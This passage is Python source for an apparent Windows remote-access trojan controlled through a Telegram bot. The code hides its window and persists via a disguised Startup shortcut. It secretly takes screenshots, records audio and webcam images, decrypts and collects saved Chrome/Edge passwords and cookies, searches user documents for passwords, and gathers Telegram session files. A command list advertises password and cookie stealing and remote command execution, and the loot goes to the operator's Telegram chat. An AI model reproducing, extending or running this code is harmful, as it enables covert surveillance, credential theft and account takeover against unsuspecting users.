            pythonw_path = shutil.which('pythonw.exe')
            script_path = os.path.abspath(sys.argv[0])
            is_exe = script_path.endswith('.exe')
            if not is_exe and not pythonw_path:
                logging.error("pythonw.exe not found. Cannot enable autostart for .py file.")
                self.send_telegram_message("Error: pythonw.exe not found. Cannot enable autostart for .py file.")
                return
            startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
            shortcut_path = os.path.join(startup_folder, 'AppHelperCap.lnk')
            if os.path.exists(shortcut_path):
                logging.info(f"Autostart shortcut already exists at {shortcut_path}")
                self.send_telegram_message(f"<b>Autostart shortcut already exists at: <pre><code class='language-path'>{shortcut_path}</code></pre> =>  <u><i>{self.device_id}</i></u></b>")
                return
            shell = win32com.client.Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(shortcut_path)
            if is_exe:
                shortcut.TargetPath = script_path
                shortcut.Arguments = ''
            else:
                shortcut.TargetPath = pythonw_path
                shortcut.Arguments = f'"{script_path}"'
            shortcut.WorkingDirectory = os.path.dirname(script_path)
            shortcut.Description = 'AppHelperCap'
            shortcut.save()
            logging.info(f"Created autostart shortcut at {shortcut_path}")
            self.send_telegram_message(f"<b>Autostart enabled via Startup folder: <pre><code class='language-path'>{shortcut_path}</code></pre> =>  <u><i>{self.device_id}</i></u></b>")
        except Exception as e:
            logging.error(f"Error enabling autostart: {str(e)}")
            self.send_telegram_message(f"Error enabling autostart on <u><i>{self.device_id}</i></u>: {str(e)}")

    def disable_autostart(self):
        """Remove the script from the Windows Startup folder."""
        try:
            startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
            shortcut_path = os.path.join(startup_folder, 'AppHelperCap.lnk')
            if os.path.exists(shortcut_path):
                os.remove(shortcut_path)
                logging.info(f"Removed autostart shortcut: {shortcut_path}")
                self.send_telegram_message(f"<b>Autostart disabled on <u><i>{self.device_id}</i></u>: <pre><code class='language-path'>{shortcut_path}</code></pre></b>")
            else:
                logging.info("No autostart shortcut found")
                self.send_telegram_message(f"No autostart shortcut found on <b><u><i>{self.device_id}</b></u></i>")
        except Exception as e:
            logging.error(f"Error disabling autostart: {str(e)}")
            self.send_telegram_message(f"Error disabling autostart on {self.device_id}: {str(e)}")

    def acquire_lock(self):
        """Ensure only one instance of the bot is running using a lock file."""
        try:
            self.lock_fd = open(self.lock_file, 'w')
            msvcrt.locking(self.lock_fd.fileno(), msvcrt.LK_NBLCK, 1)
            logging.info("Acquired lock file")
        except (IOError, OSError) as e:
            logging.error("Another instance is already running")
            self.send_telegram_message("<b>Another bot instance is running. Exiting.</b>")
            sys.exit(1)

    def release_lock(self):
        """Release the lock file when the bot exits."""
        try:
            msvcrt.locking(self.lock_fd.fileno(), msvcrt.LK_UNLCK, 1)
            self.lock_fd.close()
            if os.path.exists(self.lock_file):
                os.remove(self.lock_file)
            logging.info("Released lock file")
        except Exception as e:
            logging.error(f"Error releasing lock: {str(e)}")

    def clear_update_queue(self):
        """Clear the Telegram update queue to prevent processing old messages."""
        try:
            offset = 0
            while True:
                with update_lock:
                    updates = requests.get(
                        f'https://api.telegram.org/bot{self.bot_token}/getUpdates',
                        params={'offset': offset, 'limit': 100, 'timeout': 10},
                        timeout=30
                    ).json()
                if not updates.get('ok'):
                    logging.error(f"Failed to clear update queue: {updates.get('description', 'Unknown error')}")
                    break
                if not updates.get('result'):
                    break
                offset = updates['result'][-1]['update_id'] + 1
            logging.info("Cleared Telegram update queue")
        except Exception as e:
            logging.error(f"Error clearing update queue: {str(e)}")
            self.send_telegram_message(f"Error clearing update queue: {str(e)}")

    def hide_window(self):
        """Hide the console window."""
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            logging.info("Console window hidden")
        except Exception as e:
            logging.error(f"Error hiding window: {str(e)}")

    def send_commands_list(self):
        """Send the list of available commands to Telegram."""
        try:
            commands = [
                "/cmds - show all available commands",
                "/listdevices - List all registered devices.",
                "/selectdevice <device_id> - Select a device to control.",
                "/debugdevices - Show raw devices.json content for debugging.",
                "/enableautostart - Add the script to the Windows Startup folder.",
                "/disableautostart - Remove the script from Windows Startup.",
                "/screenshot - 🖼️ Takes and sends a screenshot.",
                "/recordaudio <sec> - 🎤 Record audio and send a audio.",
                "/webcam - 📷 Captures and sends a webcam image.",
                "/listprocesses - Lists active processes.",
                "/exitgame - Shows processes as a table with buttons to terminate.",
                "/sound - Plays a loud sound.",
                "/onwifi - Enables WiFi.",
                "/offwifi - Disables WiFi.",
                "/turnhotkey <hotkey> - Triggers a hotkey.",
                "/imagepc <img> - Sets desktop wallpaper.",
                "/imagereturn - Reverts to the original wallpaper.",
                "/showimage - Display a photo sent on the device's screen.",
                "/restart - Restarts the system.",
                "/shutdown - Shuts down the system.",
                "/lockscreen - Locks the screen (Windows+L).",
                "/openurl <url> - Opens a URL in the default browser.",
                "/sendmsg <text> - Types text into the active window.",
                "/getclipboard - Gets the clipboard content.",
                "/setclipboard <text> - Sets the clipboard content.",
                "/listfiles <path> - Lists files in the specified directory.",
                "/downloadfile <path> - 📥 Downloads a file from the device.",
                "/executecmd <command> - Executes a command in cmd.",
                "/rickroll - 🎵 Plays Rick Roll video",
                "/cmdflood <count, msg, timeout> - 💥 Opens X CMD windows",
                "/upload <file or img> - 📤 Upload file from Telegram.",
                "/passwordsteal - 🔑 Steals browser passwords",
                "/cookiesteal - 🍪 Steals browser cookies", 
                "/browserhistory - 🌐 Steals browser history",
                "/steal - 🔥 Telegram Sessions(tdata) , Discord Tokens(disdata)",
                "/stop - Stops monitoring and exits."
            ]
            escaped_commands = [html.escape(cmd) for cmd in commands]
            self.send_telegram_message(f"<b>Bot started on</b> <u><i>{self.device_id}</i></u>.\n<b>Available commands:</b>\n" + "\n".join(escaped_commands))
            logging.info("Sent commands list to Telegram")
        except Exception as e:
            logging.error(f"Error sending commands list: {str(e)}")
            self.send_telegram_message(f"<b>Error sending commands list: {str(e)}</b>")

    def setup_hotkey(self):
        """Set up a hotkey to stop the program."""
        try:
            keyboard.add_hotkey('ctrl+shift+f10', self.stop_program)
            logging.info("Hotkey Ctrl+Shift+F10 set up")
        except Exception as e:
            logging.error(f"Error setting up hotkey: {str(e)}")
            self.send_telegram_message(f"Error setting up hotkey: {str(e)}")

    def stop_program(self):
        """Stop the program via hotkey."""
        try:
            self.running = False
            self.keyboard_locked = False
            ctypes.windll.user32.BlockInput(False)
            self.send_telegram_message(f"Program stopped on <u><i>{self.device_id}</i></u> via Ctrl+Shift+F10.")
            logging.info("Program stopped via hotkey")
            self.release_lock()
            sys.exit(0)
        except Exception as e:
            logging.error(f"Error stopping program: {str(e)}")
            self.send_telegram_message(f"Error stopping program: {str(e)}")
            self.release_lock()

    def heartbeat(self):
        """Send periodic heartbeat messages to indicate the bot is running."""
        while self.running:
            try:
                self.send_telegram_message(f"Bot is running on <b><u><i>{self.device_id}</i></u></b> (heartbeat).")
                with file_lock:
                    devices = self.load_devices()
                    device_id_lower = self.device_id.lower()
                    
                    # Find actual device ID (case-insensitive)
                    actual_device_id = None
                    for existing_id in devices['devices']:
                        if existing_id.lower() == device_id_lower:
                            actual_device_id = existing_id
                            break
                    
                    # If device not found, re-register it (recovery mechanism)
                    if actual_device_id is None:
                        logging.warning(f"Device {self.device_id} not found in devices.json, re-registering")
                        devices['devices'][self.device_id] = {
                            'chat_id': self.chat_id,
                            'last_seen': str(datetime.now())
                        }
                        actual_device_id = self.device_id
                    else:
                        # Update last_seen for existing device
                        devices['devices'][actual_device_id]['last_seen'] = str(datetime.now())
                        # Also update chat_id in case it changed
                        devices['devices'][actual_device_id]['chat_id'] = self.chat_id
                    
                    self.save_devices(devices)
                logging.info("Sent heartbeat message")
                time.sleep(60)
            except Exception as e:
                logging.error(f"Error in heartbeat: {str(e)}")
                time.sleep(60)

    def get_system_info(self):
        """Collect system information."""
        try:
            info = {}
            info['Hostname'] = socket.gethostname()
            info['Ip'] = socket.gethostbyname(socket.gethostname())
            info['Os'] = platform.system() + ' ' + platform.release()
            info['Username'] = getpass.getuser()
            info['Cpu'] = platform.processor()
            info['Ram'] = str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + ' GB'
            logging.info("Collected system info")
            return info
        except Exception as e:
            logging.error(f"Error getting system info: {str(e)}")
            return {}

    def get_browser_paths(self):
        """Get paths to browser data directories."""
        try:
            browsers = {
                'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
                'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data')
            }
            return browsers
        except Exception as e:
            logging.error(f"Error getting browser paths: {str(e)}")
            return {}

    def decrypt_chrome_password(self, encrypted_password, key):
        """Decrypt Chrome/Edge passwords."""
        try:
            if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
                iv = encrypted_password[3:15]
                payload = encrypted_password[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                decrypted_pass = unpad(cipher.decrypt(payload), 16)
                return decrypted_pass.decode()
            else:
                decrypted_pass = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                return decrypted_pass.decode()
        except Exception as e:
            logging.error(f"Error decrypting Chrome password: {str(e)}")
            return ''

    def get_chrome_encryption_key(self):
        """Get the encryption key for Chrome/Edge passwords."""
        try:
            local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Local State')
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            key = key[5:]  # Remove 'DPAPI' prefix
            key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            return key
        except Exception as e:
            logging.error(f"Error getting Chrome encryption key: {str(e)}")
            return None

    def filter_valid_data(self, data_list):
        """Filter valid data entries."""
        try:
            filtered = [item for item in data_list if item and len(item) > 3]
            return filtered
        except Exception as e:
            logging.error(f"Error filtering data: {str(e)}")
            return []

    def get_browser_passwords(self):
        """Collect browser passwords."""
        try:
            passwords = []
            browsers = self.get_browser_paths()
            for browser, path in browsers.items():
                if os.path.exists(path):
                    key = self.get_chrome_encryption_key()
                    if not key:
                        continue
                    profiles = ['Default'] + [f'Profile {i}' for i in range(1, 5)]
                    for profile in profiles:
                        login_data = os.path.join(path, profile, 'Login Data')
                        if os.path.exists(login_data):
                            temp_db = os.path.join(self.data_dir, f'{browser}_{profile}_Login_Data')
                            shutil.copy2(login_data, temp_db)
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                            for row in cursor.fetchall():
                                url, username, encrypted_password = row
                                password = self.decrypt_chrome_password(encrypted_password, key) if encrypted_password else ''
                                if username or password:
                                    passwords.append(f'{browser} | URL: {url} | User: {username} | Pass: {password}')
                            conn.close()
                            os.remove(temp_db)
            return self.filter_valid_data(passwords)
        except Exception as e:
            logging.error(f"Error getting browser passwords: {str(e)}")
            return []

    def get_browser_cookies(self):
        """Collect browser cookies."""
        try:
            cookies = []
            browsers = self.get_browser_paths()
            for browser, path in browsers.items():
                if os.path.exists(path):
                    profiles = ['Default'] + [f'Profile {i}' for i in range(1, 5)]
                    for profile in profiles:
                        cookie_data = os.path.join(path, profile, 'Cookies')
                        if os.path.exists(cookie_data):
                            temp_db = os.path.join(self.data_dir, f'{browser}_{profile}_Cookies')
                            shutil.copy2(cookie_data, temp_db)
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
                            for row in cursor.fetchall():
                                host, name, value, encrypted_value = row
                                if encrypted_value:
                                    key = self.get_chrome_encryption_key()
                                    if key:
                                        value = self.decrypt_chrome_password(encrypted_value, key) or value
                                if host and name and value:
                                    cookies.append(f'{browser} | Host: {host} | Name: {name} | Value: {value}')
                            conn.close()
                            os.remove(temp_db)
            return self.filter_valid_data(cookies)
        except Exception as e:
            logging.error(f"Error getting browser cookies: {str(e)}")
            return []

    def search_files_for_passwords(self):
        """Search for passwon rds ifiles."""
        try:
            found_data = []
            search_paths = [
                os.path.join(os.getenv('USERPROFILE'), 'Desktop'),
                os.path.join(os.getenv('USERPROFILE'), 'Documents'),
                os.path.join(os.getenv('USERPROFILE'), 'Downloads')
            ]
            for path in search_paths:
                for ext in ['*.txt', '*.docx', '*.pdf']:
                    for file in glob.glob(os.path.join(path, ext)):
                        try:
                            with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                passwords = re.findall(r'(?i)(?:password|pass|pwd|key):?\s*[\S]{6,}', content)
                                if passwords:
                                    found_data.append(f'File: {file} | Found: {"; ".join(passwords)}')
                        except:
                            pass
            return self.filter_valid_data(found_data)
        except Exception as e:
            logging.error(f"Error searching files for passwords: {str(e)}")
            return []

    def get_telegram_session(self):
        """Collect Telegram session files."""
        try:
            session_files = []
            session_path = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
            if os.path.exists(session_path):
                for file in glob.glob(os.path.join(session_path, '*')):
                    if os.path.isfile(file):
                        session_files.append(file)
            return session_files
        except Exception as e:
            logging.error(f"Error getting Telegram session files: {str(e)}")
            return []

    def create_md(self, data_type, data, title=None):
        """Create a Markdown file with collected data."""
        try:
            if not data:
                return None
            
            # Get file path based on data type
            file_path_map = {
                'passwords': self.passwords_md_file,
                'cookies': self.cookies_md_file,
                'history': self.history_md_file,
                'emails': os.path.join(self.data_dir, f'emails_{self.device_id}.md'),
                'files': os.path.join(self.data_dir, f'files_data_{self.device_id}.md'),
                'telegram': os.path.join(self.data_dir, f'telegram_data_{self.device_id}.md')
            }
            
            file_path = file_path_map.get(data_type, os.path.join(self.data_dir, f'data_{self.device_id}.md'))
            
            # Get system info
            system_info = self.get_system_info()
            
            # Create Markdown content
            md_content = f"# {title or data_type.capitalize()} Stolen from {self.device_id}\n\n"
            md_content += f"**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            
            # System Info section
            md_content += "## System Info\n\n"
            for k, v in system_info.items():
                md_content += f"- **{k}:** {v}\n"
            md_content += "\n"
            
            # Data section
            section_title = data_type.capitalize()
            if data_type == 'passwords':
                section_title = "Passwords"
            elif data_type == 'cookies':
                section_title = "Cookies"
            elif data_type == 'history':
                section_title = "Browser History"
            
            md_content += f"## {section_title} ({len(data)})\n\n"
            
            for i, item in enumerate(data, 1):
                md_content += f"{i}. {item}\n"
            
            # Write to file
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(md_content)
            
            logging.info(f"Created Markdown file: {file_path}")
            return file_path
        except Exception as e:
            logging.error(f"Error creating Markdown file: {str(e)}")
            return None

    def take_screenshot(self):
        """Take and send a screenshot."""
        try:
            screenshot = pyautogui.screenshot()
            screenshot.save(self.screenshot_file)
            with open(self.screenshot_file, 'rb') as f:
                files = {'photo': (os.path.basename(self.screenshot_file), f)}
                payload = {'chat_id': self.chat_id}
                requests.post(self.telegram_photo_api, data=payload, files=files, timeout=100)
            logging.info("Screenshot taken and sent")
            # Delete screenshot file
            os.remove(self.screenshot_file)
            return f"<b>Screenshot taken and sent from</b> <u><i>{self.device_id}.</i></u>"
        except Exception as e:
            logging.error(f"Error taking screenshot: {str(e)}")
            return f"Error taking screenshot on <u><i>{self.device_id}</i></u>: {str(e)}"

    def record_audio(self, duration):
        """Record audio using sounddevice and send it via Telegram."""
        try:
            # Validate duration
            if duration <= 0:
                error_msg = f"Invalid duration: {duration}. Duration must be greater than 0."
                logging.error(error_msg)
                return f"Error: {error_msg}"
            
            fs = 44100  # Sample rate
            audio_filename = self.recordaudio_file 
            
            logging.info(f"Starting audio recording for {duration} seconds...")
            logging.info(f"Audio file will be saved to: {audio_filename}")

            # Record audio
            logging.info("Recording audio...")
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=1, dtype='int16')
            sd.wait()
            logging.info("Recording completed, processing audio...")

            # Save audio file
            logging.info(f"Saving audio to file: {audio_filename}")
            write(audio_filename, fs, recording)
            
            # Verify file was created
            if not os.path.exists(audio_filename):
                error_msg = f"Audio file was not created: {audio_filename}"
                logging.error(error_msg)
                return f"Error: {error_msg}"
            
            file_size = os.path.getsize(audio_filename)
            logging.info(f"Audio file saved successfully. Size: {file_size} bytes")

            # Send audio file via Telegram
            logging.info("Sending audio file via Telegram...")
            with open(audio_filename, 'rb') as f:
                files = {'audio': (os.path.basename(audio_filename), f)}
                payload = {'chat_id': self.chat_id}
                response = requests.post(self.telegram_audio_api, data=payload, files=files, timeout=100)
                
                if response.status_code != 200:
                    error_msg = f"Failed to send audio. Telegram API returned status {response.status_code}"
                    logging.error(error_msg)
                    return f"Error: {error_msg}"

            logging.info("Audio recorded and sent successfully")
        
            # Delete audio file
            os.remove(audio_filename)
            return f"<b>Audio recorded</b> <u>({duration}s)</u> and sent from <u><i>{self.device_id}</i></u>."
        except ValueError as e:
            error_msg = f"Invalid duration value: {str(e)}"
            logging.error(error_msg)
            return f"Error: {error_msg}"
        except Exception as e:
            error_msg = f"Error recording audio: {str(e)}"
            logging.error(error_msg, exc_info=True)
            return f"Error recording audio on <u><i>{self.device_id}</i></u>: {str(e)}"

    def exit_game(self, process_name=None):
        """Terminate a specified process."""
        try:
            if not process_name:
                return "<b>Please specify a process name (e.g., chrome.exe).</b>"
            terminated = False
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() == process_name.lower():
                    proc.terminate()
                    terminated = True
            if terminated:
                logging.info(f"Terminated all processes: {process_name}")
                return f"<b>Terminated all processes on</b> <u><i>{self.device_id}</i></u><b>: {process_name}</b>"
            logging.warning(f"Process not found: {process_name}")
            return f"<b>Process {process_name} not found on</b> <u><i>{self.device_id}</i></u>."
        except Exception as e:
            logging.error(f"Error exiting process: {str(e)}")
            return f"Error exiting process on <u><i>{self.device_id}</i></u>: {str(e)}"

    def capture_webcam(self):
        """Capture and send a webcam image."""

        try:
            subprocess.run(["assets/camcap.exe"], 
                                            cwd=self.data_dir, 
                                            stdout=subprocess.DEVNULL,
                                            stderr=subprocess.DEVNULL,
                                            creationflags=subprocess.CREATE_NO_WINDOW
            )
            time.sleep(2)
            
            files = [f for f in os.listdir(self.data_dir) if f.lower().endswith(".jpg")]
            
            if not files:
                logging.warning("No JPG files found after camcap execution")
                return f"Failed to capture webcam image on <u><i>{self.device_id}</i></u>."
            
            latest = max(files, key=lambda f: os.path.getctime(os.path.join(self.data_dir, f)))
            latest_path = os.path.join(self.data_dir, latest)
            self.send_telegram_message(f"Waiting for webcam image to be captured...")
            os.rename(latest_path, self.webcam_file)
            
            try:
                with open(self.webcam_file, 'rb') as f:
                    files = {'photo': (os.path.basename(self.webcam_file), f)}
                    payload = {'chat_id': self.chat_id}
                    requests.post(self.telegram_photo_api, data=payload, files=files, timeout=100)
                
                self.send_telegram_message(f"Webcam image captured and sent from <u><i>{self.device_id}</i></u>.")
                os.remove(self.webcam_file)
                logging.info("Webcam image captured and sent")
                return f"Webcam image captured and sent from <u><i>{self.device_id}</i></u>."
            except Timeout:
                logging.warning("Timeout while sending webcam image to Telegram")
                if os.path.exists(self.webcam_file):
                    os.remove(self.webcam_file)
                error_msg = f"Timeout Failed to send webcam image from <u><i>{self.device_id}</i></u>"
                self.send_telegram_message(error_msg)
                return error_msg
            except RequestException as e:
                is_timeout = False

                if e.args:
                    for arg in e.args:
                        if isinstance(arg, TimeoutError) or (isinstance(arg, tuple) and any(isinstance(x, TimeoutError) for x in arg)):
                            is_timeout = True
                            break

                error_str = str(e).lower()
                if 'timeout' in error_str or 'timed out' in error_str:
                    is_timeout = True
                
                if is_timeout:
                    logging.warning("Timeout while sending webcam image to Telegram (detected in RequestException)")
                    if os.path.exists(self.webcam_file):
                        os.remove(self.webcam_file)
                    error_msg = f"Timeout Failed to send webcam image from <b><u><i>{self.device_id}</i></u></b>"
                    self.send_telegram_message(error_msg)
                    return error_msg
                else:
                    logging.error(f"Request error while sending webcam image: {str(e)}")
                    if os.path.exists(self.webcam_file):
                        os.remove(self.webcam_file)
                    error_msg = f"Error sending webcam image from <u><i>{self.device_id}</i></u>: {str(e)}"
                    self.send_telegram_message(error_msg)
                    return error_msg
            
        except subprocess.CalledProcessError as e:
            logging.error(f"Error running camcap.exe: {str(e)}")
            return f"Error capturing webcam on <u><i>{self.device_id}</i></u>: {str(e)}"
        except FileNotFoundError:
            logging.warning("camcap.exe not found")
            return f"Webcam not found on <u><i>{self.device_id}</i></u>."
        except Exception as e:
            logging.error(f"Error capturing webcam: {str(e)}")
            return f"Error capturing webcam on <u><i>{self.device_id}</i></u>: {str(e)}"

    def list_processes(self):
        """List all running processes."""
        try:
            process_map = {
                'chrome.exe': 'Google Chrome',
                'msedge.exe': 'Microsoft Edge',
                'firefox.exe': 'Mozilla Firefox',
                'cs2.exe': 'Counter-Strike 2',
                'notepad.exe': 'Notepad',
                'explorer.exe': 'Windows Explorer',
                'taskmgr.exe': 'Task Manager',
                'cmd.exe': 'Command Prompt',
                'excel.exe': 'Microsoft Excel',
                'winword.exe': 'Microsoft Word',
                'powerpnt.exe': 'Microsoft PowerPoint',
                'outlook.exe': 'Microsoft Outlook',
                'steam.exe': 'Steam Client',
                'discord.exe': 'Discord',
                'spotify.exe': 'Spotify',
                'telegram.exe': 'Telegram',
                'avastsvc.exe': 'Avast Service',
                'adguard.exe': 'AdGuard',
                'onedrive.exe': 'OneDrive',
                'notepad++.exe': 'Notepad++',
                'system idle process': 'System Idle Process',
                'system': 'System',
                'registry': 'Registry',
                'smss.exe': 'Session Manager',
                'csrss.exe': 'Client Server Runtime',
                'wininit.exe': 'Windows Start-Up',
                'services.exe': 'Services',
                'lsass.exe': 'Local Security Authority',
                'winlogon.exe': 'Windows Logon',
                'dwm.exe': 'Desktop Window Manager',
                'fontdrvhost.exe': 'Font Driver Host',
                'svchost.exe': 'Service Host',
                'startmenuexperiencehost.exe': 'Start Menu',
                'shellexperiencehost.exe': 'Shell Experience',
                'searchapp.exe': 'Search App',
                'runtimebroker.exe': 'Runtime Broker',
                'applicationframehost.exe': 'Application Frame Host',
                'systemsettings.exe': 'System Settings'
            }
            processes = []
            seen = set()
            for proc in psutil.process_iter(['name', 'exe']):
                name = proc.info['name'].lower()
                if name not in seen:
                    seen.add(name)
                    friendly_name = process_map.get(name, name.capitalize())
                    processes.append({'name': proc.info['name'], 'friendly_name': friendly_name, 'exe': proc.info['exe'] or 'N/A'})
            logging.info(f"Listed {len(processes)} processes")
            return sorted(processes, key=lambda x: x['friendly_name'])
        except Exception as e:
            logging.error(f"Error listing processes: {str(e)}")
            return []

    def format_process_table(self, processes, page):
        """Format process list as a table for Telegram."""
        try:
            start_idx = page * self.processes_per_page
            end_idx = start_idx + self.processes_per_page
            page_processes = processes[start_idx:end_idx]
            if not page_processes:
                return f"<b>No processes found on</b> <u><i>{self.device_id}</i></u>.", []
            table = "```\n"
            table += f"{'ID':<4} {'Process Name':<30} {'Executable':<40}\n"
            table += "-" * 74 + "\n"
            buttons = []
            for idx, proc in enumerate(page_processes, start_idx + 1):
                table += f"{idx:<4} {proc['friendly_name'][:29]:<30} {proc['name'][:39]:<40}\n"
                buttons.append([{"text": f"Kill {proc['friendly_name']}", "callback_data": f"exitgame_{proc['name']}"}])
            table += "```"
            nav_buttons = []
            if page > 0:
                nav_buttons.append({"text": "Previous", "callback_data": f"page_{page-1}"})
            if end_idx < len(processes):
                nav_buttons.append({"text": "Next", "callback_data": f"page_{page+1}"})
            if nav_buttons:
                buttons.append(nav_buttons)
            message = f"Active Processes on {self.device_id} (Page {page + 1}):\n{table}\nSelect a process to terminate:"
            return message, buttons
        except Exception as e:
            logging.error(f"Error formatting process table: {str(e)}")
            return f"Error formatting process table on {self.device_id}: {str(e)}", []

    def send_process_buttons(self, page=0):
        """Send process list with interactive buttons."""
        try:
            self.process_list = self.list_processes()
            if not self.process_list:
                self.send_telegram_message(f"<b>No processes found on</b> <u><i>{self.device_id}</i></u>.")
                return
            message, buttons = self.format_process_table(self.process_list, page)
            keyboard = {"inline_keyboard": buttons}
            payload = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': 'Markdown',
                'reply_markup': json.dumps(keyboard)
            }
            requests.post(self.telegram_text_api, json=payload, timeout=30)
            self.current_page = page
            logging.info(f"Sent process table for page {page + 1} on {self.device_id}")
        except Exception as e:
            logging.error(f"Error sending process buttons: {str(e)}")
            self.send_telegram_message(f"Error sending process buttons on <u><i>{self.device_id}</i></u>: {str(e)}")

    def set_wallpaper(self, image_path):
        """Set the desktop wallpaper."""
        try:
            SPI_GETDESKWALLPAPER = 0x0073
            buffer = ctypes.create_unicode_buffer(260)
            ctypes.windll.user32.SystemParametersInfoW(SPI_GETDESKWALLPAPER, 260, buffer, 0)
            current_wallpaper = buffer.value
            if current_wallpaper and os.path.exists(current_wallpaper):
                try:
                    shutil.copy2(current_wallpaper, self.original_wallpaper_file)
                    logging.info(f"Saved original wallpaper: {current_wallpaper}")
                except Exception as e:
                    logging.warning(f"Failed to save original wallpaper: {str(e)}")
            max_attempts = 5
            for attempt in range(max_attempts):
                try:
                    SPI_SETDESKWALLPAPER = 20
                    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, os.path.abspath(image_path), 3)
                    logging.info(f"Wallpaper set to: {image_path}")
                    return f"<b>Wallpaper set successfully on</b> <u><i>{self.device_id}</i></u>."
                except WindowsError as e:
                    if e.winerror == 32:
                        logging.warning(f"Attempt {attempt + 1}: File in use, retrying...")
                        time.sleep(1)
                    else:
                        raise e
            raise WindowsError("Failed to set wallpaper after multiple attempts: file still in use")
        except Exception as e:
            logging.error(f"Error setting wallpaper: {str(e)}")
            return f"Error setting wallpaper on <u><i>{self.device_id}</i></u>: {str(e)}"

    def restore_wallpaper(self):
        """Restore the original desktop wallpaper."""
        try:
            if os.path.exists(self.original_wallpaper_file):
                max_attempts = 5
                for attempt in range(max_attempts):
                    try:
                        SPI_SETDESKWALLPAPER = 20
                        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, os.path.abspath(self.original_wallpaper_file), 3)
                        logging.info("Restored original wallpaper")
                        return f"<b>Original wallpaper restored on</b> <u><i>{self.device_id}</i></u>."
                    except WindowsError as e:
                        if e.winerror == 32:
                            logging.warning(f"Attempt {attempt + 1}: File in use, retrying...")
                            time.sleep(1)
                        else:
                            raise e
                raise WindowsError("Failed to restore wallpaper after multiple attempts: file still in use")
            else:
                logging.warning("No original wallpaper found")
                return f"<b>No original wallpaper found to restore on</b> <u><i>{self.device_id}</i></u>."
        except Exception as e:
            logging.error(f"Error restoring wallpaper: {str(e)}")
            return f"Error restoring wallpaper on <u><i>{self.device_id}</i></u>: {str(e)}"

    def download_photo(self, file_id):
        """Download a photo from Telegram to set as wallpaper."""
        try:
            file_info = requests.get(
                f'https://api.telegram.org/bot{self.bot_token}/getFile',
                params={'file_id': file_id},
                timeout=30
            ).json()
            if not file_info.get('ok'):
                raise Exception(f"Failed to get file info: {file_info.get('description', 'Unknown error')}")
            file_path = file_info['result']['file_path']
            file_url = f'https://api.telegram.org/file/bot{self.bot_token}/{file_path}'
            with tempfile.NamedTemporaryFile(delete=False, suffix='.jpg') as temp_file:
                response = requests.get(file_url, timeout=30, stream=True)
                response.raise_for_status()
                for chunk in response.iter_content(chunk_size=8192):
                    temp_file.write(chunk)
                temp_file_path = temp_file.name
            max_attempts = 5
            for attempt in range(max_attempts):
                try:
                    if os.path.exists(self.wallpaper_file):
                        os.remove(self.wallpaper_file)
                    shutil.move(temp_file_path, self.wallpaper_file)
                    logging.info(f"Downloaded photo to: {self.wallpaper_file}")
                    return True
                except Exception as e:
                    if isinstance(e, OSError) and e.winerror == 32:
                        logging.warning(f"Attempt {attempt + 1}: File in use, retrying...")
                        time.sleep(1)
                    else:
                        raise e
            os.remove(temp_file_path)
            raise Exception("Failed to move temp file after multiple attempts: file still in use")
        except Exception as e:
            logging.error(f"Error downloading photo: {str(e)}")
            if 'temp_file_path' in locals() and os.path.exists(temp_file_path):
                os.remove(temp_file_path)
            return False

    def show_image(self, file_id):
        """Download a photo from Telegram and display it on the screen."""
        try:
            file_info = requests.get(
                f'https://api.telegram.org/bot{self.bot_token}/getFile',
                params={'file_id': file_id},
                timeout=30
            ).json()
            if not file_info.get('ok'):
                raise Exception(f"Failed to get file info: {file_info.get('description', 'Unknown error')}")
            file_path = file_info['result']['file_path']
            file_url = f'https://api.telegram.org/file/bot{self.bot_token}/{file_path}'
            temp_image_path = os.path.join(self.data_dir, 'temp_image.jpg')
            with requests.get(file_url, timeout=30, stream=True) as response:
                response.raise_for_status()
                with open(temp_image_path, 'wb') as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        f.write(chunk)
            image = Image.open(temp_image_path)
            image.show()
            logging.info(f"Displayed image: {temp_image_path}")
            os.remove(temp_image_path)
            return f"<b>Image displayed on</b> <u><i>{self.device_id}</i></u>."
        except Exception as e:
            logging.error(f"Error displaying image: {str(e)}")
            if 'temp_image_path' in locals() and os.path.exists(temp_image_path):
                os.remove(temp_image_path)
            return f"Error displaying image on <u><i>{self.device_id}</i></u>: {str(e)}"

    def restart_system(self):
        """Restart the system."""
        try:
            subprocess.run(['shutdown', '/r', '/t', '0'], check=True)
            logging.info("System restart initiated")
            return f"<b>System restart initiated on</b> <u><i>{self.device_id}</i></u>."
        except Exception as e:
            logging.error(f"Error restarting system: {str(e)}")
            return f"<b>Error restarting system on</b> <u><i>{self.device_id}</i></u>: {str(e)}"

    def shutdown_system(self):
        """Shut down the system."""
        try:
            subprocess.run(['shutdown', '/s', '/t', '0'], check=True)
            logging.info("System shutdown initiated")
